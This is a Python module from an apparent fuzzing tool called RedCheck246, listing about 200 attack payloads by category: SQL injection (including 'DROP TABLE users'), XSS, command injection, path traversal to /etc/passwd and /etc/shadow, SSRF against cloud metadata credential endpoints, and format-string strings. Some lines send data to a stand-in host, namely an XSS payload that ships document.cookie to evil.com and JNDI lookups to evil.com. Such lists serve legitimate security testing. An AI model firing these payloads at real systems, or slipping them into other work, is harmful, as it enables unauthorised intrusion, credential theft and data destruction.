"""RedCheck246 — Fuzzing payloads organized by attack category.

~200 payloads across SQL injection, XSS, command injection,
path traversal, SSRF, and format string categories.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------

SQLI_PAYLOADS: list[str] = [
    # Authentication bypass
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "' OR ''='",
    "1' OR '1'='1",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT 1,@@version--",
    "' UNION SELECT username,password FROM users--",
    # Error-based
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    (
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),"
        "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ),
    # Time-based blind
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000,SHA1('test'))--",
    "1; SELECT pg_sleep(5)--",
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO logs VALUES('pwned')--",
    # Encoding evasion
    "%27%20OR%20%271%27%3D%271",
    "' /*!OR*/ 1=1--",
    "' OR/**/ 1=1--",
]

# ---------------------------------------------------------------------------
# Cross-Site Scripting (XSS)
# ---------------------------------------------------------------------------

XSS_PAYLOADS: list[str] = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    '"><script>alert(1)</script>',
    "';alert(1)//",
    # Event handlers
    '<div onmouseover="alert(1)">hover</div>',
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    # SVG / MathML
    "<svg><script>alert(1)</script></svg>",
    "<svg/onload=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    # Encoding evasion
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "jaVasCript:alert(1)",
    "javascript:alert(1)//",
    # Template injection
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{constructor.constructor('return this')()}}",
    # Data URI
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',
    # DOM-based
    "<img src=1 onerror=\"this.src='http://evil.com/?c='+document.cookie\">",
]

# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------

CMDI_PAYLOADS: list[str] = [
    # Unix
    "; ls",
    "; ls -la",
    "| ls",
    "| cat /etc/passwd",
    "`ls`",
    "$(ls)",
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "; uname -a",
    "| uname -a",
    "; sleep 5",
    "| sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    # Windows
    "& dir",
    "| dir",
    "; dir",
    "& whoami",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "& ping -n 5 127.0.0.1",
    # Chained / blind
    ";echo${IFS}pwned",
    "||echo pwned",
    "&&echo pwned",
    "$(echo pwned)",
    # Encoding evasion
    "%0als",
    "%0aid",
    "\\nls",
    "\\nid",
]

# ---------------------------------------------------------------------------
# Path Traversal
# ---------------------------------------------------------------------------

PATH_TRAVERSAL_PAYLOADS: list[str] = [
    # Unix
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/shadow",
    "../../../etc/hosts",
    "../../../proc/self/environ",
    # Windows
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\Windows\\win.ini",
    "..\\..\\..\\boot.ini",
    # URL encoding
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    # Null byte (legacy)
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd\x00.png",
    # Absolute path
    "/etc/passwd",
    "/etc/shadow",
    "C:\\Windows\\win.ini",
    # Wrapper bypass
    "....//....//....//etc/passwd",
    "..../....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
]

# ---------------------------------------------------------------------------
# Server-Side Request Forgery (SSRF)
# ---------------------------------------------------------------------------

SSRF_PAYLOADS: list[str] = [
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Localhost
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:27017/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    # Internal network
    "http://10.0.0.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
    # DNS rebinding
    "http://spoofed.burpcollaborator.net/",
    # Protocol smuggling
    "gopher://127.0.0.1:25/_HELO",
    "dict://127.0.0.1:11211/stat",
    "file:///etc/passwd",
    # Encoding evasion
    "http://0x7f000001/",  # hex IP
    "http://2130706433/",  # decimal IP
    "http://0177.0.0.1/",  # octal IP
]

# ---------------------------------------------------------------------------
# Format String
# ---------------------------------------------------------------------------

FORMAT_STRING_PAYLOADS: list[str] = [
    "%s%s%s%s%s",
    "%n%n%n%n%n",
    "%x%x%x%x%x",
    "%d%d%d%d%d",
    "%p%p%p%p%p",
    "AAAA%08x.%08x.%08x.%08x",
    "%1$s%2$s%3$s",
    "%.16705u%2$hn",
    "{0}{1}{2}{3}{4}",
    "${jndi:ldap://evil.com/a}",
    "${jndi:rmi://evil.com/a}",
]

# ---------------------------------------------------------------------------
# Boundary / mutation values
# ---------------------------------------------------------------------------

BOUNDARY_VALUES: list[str] = [
    "",  # empty
    " ",  # space only
    "\x00",  # null byte
    "\t\n\r",  # whitespace chars
    "A" * 1000,  # long string
    "A" * 10000,  # very long string
    "-1",
    "0",
    "1",
    "2147483647",  # INT_MAX
    "-2147483648",  # INT_MIN
    "9999999999999999999",  # overflow
    "0.0",
    "NaN",
    "Infinity",
    "-Infinity",
    "null",
    "undefined",
    "true",
    "false",
    "[]",
    "{}",
    '{"__proto__": {"polluted": true}}',  # prototype pollution
    "\xff\xfe",  # BOM
    "\xef\xbb\xbf",  # UTF-8 BOM
]

# ---------------------------------------------------------------------------
# All payloads by category
# ---------------------------------------------------------------------------

ALL_PAYLOADS: dict[str, list[str]] = {
    "sqli": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "cmdi": CMDI_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
    "format_string": FORMAT_STRING_PAYLOADS,
    "boundary": BOUNDARY_VALUES,
}
